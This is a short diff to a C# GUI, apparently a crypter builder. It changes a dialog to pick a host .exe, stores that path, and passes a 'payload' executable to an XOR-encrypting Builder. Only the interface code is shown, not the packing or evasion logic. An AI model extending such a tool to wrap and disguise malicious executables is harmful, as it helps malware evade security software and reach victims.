@@ -32,14 +32,14 @@ namespace Crypt
             }
         }
 
-        private void btnBrowseIcon_Click(object sender, EventArgs e)
+        private void btnBrowseHost_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog selectIconDialog = new OpenFileDialog())
             {
-                selectIconDialog.Filter = "Icon files|*.ico";
+                selectIconDialog.Filter = "Executable files|*.exe";
                 if (selectIconDialog.ShowDialog() == DialogResult.OK)
                 {
-                    txtIcon.Text = selectIconDialog.FileName;
+                    txtHost.Text = selectIconDialog.FileName;
                 }
             }
         }
@@ -61,8 +61,9 @@ namespace Crypt
         private bool Build()
         {
             options.encryptionType = EncryptionType.XOR; //TODO: Add encryption type selection
-
+            options.hostDir = txtHost.Text;
             Byte[] payloadPE = File.ReadAllBytes(txtPayload.Text);
+
             Builder builder = new Builder(payloadPE, options);
             bool buildResult = builder.Build();
             return buildResult;
